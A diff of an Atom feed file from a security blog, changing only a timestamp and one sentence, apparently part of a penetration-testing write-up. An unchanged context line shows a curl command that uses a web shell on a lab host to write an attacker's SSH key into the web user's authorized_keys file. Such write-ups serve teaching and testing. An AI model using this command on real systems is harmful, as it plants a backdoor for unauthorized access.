@@ -4,7 +4,7 @@
   <title><![CDATA[0x73696e65]]></title>
   <link href="http://73696e65.github.io/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-12-12T12:42:47+01:00</updated>
+  <updated>2015-12-12T12:58:22+01:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -530,7 +530,7 @@ shell and we can do this manually. To use this technique, we need credentials to
 </pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=echo+'ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX'>~www-data/.ssh/authorized_keys"</span></code></pre></td></tr></table></div></figure>
 
 
-<p>We verify successful upload:</p>
+<p>We verify the successful upload:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
